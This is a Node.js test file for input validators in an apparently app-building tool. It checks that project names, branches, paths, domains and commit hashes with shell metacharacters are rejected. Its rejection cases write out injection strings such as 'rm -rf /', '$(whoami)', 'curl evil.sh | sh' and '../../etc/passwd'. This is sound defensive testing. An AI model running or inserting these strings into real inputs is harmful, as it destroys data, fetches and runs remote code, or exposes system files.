const { test } = require('node:test');
const assert = require('node:assert/strict');
const {
    assertSafeProjectName,
    assertSafeRepository,
    assertSafeBranch,
    assertSafePathSegment,
    assertSafeDomain,
    assertSafeCommitHash
} = require('../utils/validate');

test('assertSafeProjectName accepts normal names', () => {
    assert.doesNotThrow(() => assertSafeProjectName('my-app'));
    assert.doesNotThrow(() => assertSafeProjectName('my_app_2'));
    assert.doesNotThrow(() => assertSafeProjectName('a'));
});

test('assertSafeProjectName rejects shell metacharacters', () => {
    assert.throws(() => assertSafeProjectName('app; rm -rf /'));
    assert.throws(() => assertSafeProjectName('$(whoami)'));
    assert.throws(() => assertSafeProjectName('app`id`'));
    assert.throws(() => assertSafeProjectName(''));
});

test('assertSafeBranch accepts branch names with slashes and dots', () => {
    assert.doesNotThrow(() => assertSafeBranch('feature/login-page'));
    assert.doesNotThrow(() => assertSafeBranch('release-1.2.0'));
});

test('assertSafeBranch rejects injection attempts', () => {
    assert.throws(() => assertSafeBranch('main; curl evil.sh | sh'));
    assert.throws(() => assertSafeBranch('main && rm -rf /'));
});

test('assertSafeRepository rejects path traversal / injection', () => {
    assert.throws(() => assertSafeRepository('../../etc/passwd'));
    assert.throws(() => assertSafeRepository('repo\nEvilCommand'));
});

test('assertSafePathSegment rejects shell metacharacters in cloned paths', () => {
    assert.doesNotThrow(() => assertSafePathSegment('/tmp/apk-builds/my-app-123/android'));
    assert.throws(() => assertSafePathSegment('/tmp/apk-builds/my-app"; rm -rf ~ #/android'));
});

test('assertSafeDomain accepts plain hostnames', () => {
    assert.doesNotThrow(() => assertSafeDomain('myapp.com'));
    assert.doesNotThrow(() => assertSafeDomain('sub.domain.example.co.kr'));
});

test('assertSafeDomain rejects protocol, paths, and injection attempts', () => {
    assert.throws(() => assertSafeDomain('https://myapp.com'));
    assert.throws(() => assertSafeDomain('myapp.com/path'));
    assert.throws(() => assertSafeDomain('myapp.com; rm -rf /'));
    assert.throws(() => assertSafeDomain(''));
});

test('assertSafeCommitHash accepts short and full hex hashes', () => {
    assert.doesNotThrow(() => assertSafeCommitHash('ae58aff'));
    assert.doesNotThrow(() => assertSafeCommitHash('ae58affaa307f5f934d34b7b272ff75b66984672'));
});

test('assertSafeCommitHash rejects non-hex and injection attempts', () => {
    assert.throws(() => assertSafeCommitHash('main'));
    assert.throws(() => assertSafeCommitHash('ae58aff; rm -rf /'));
    assert.throws(() => assertSafeCommitHash(''));
});
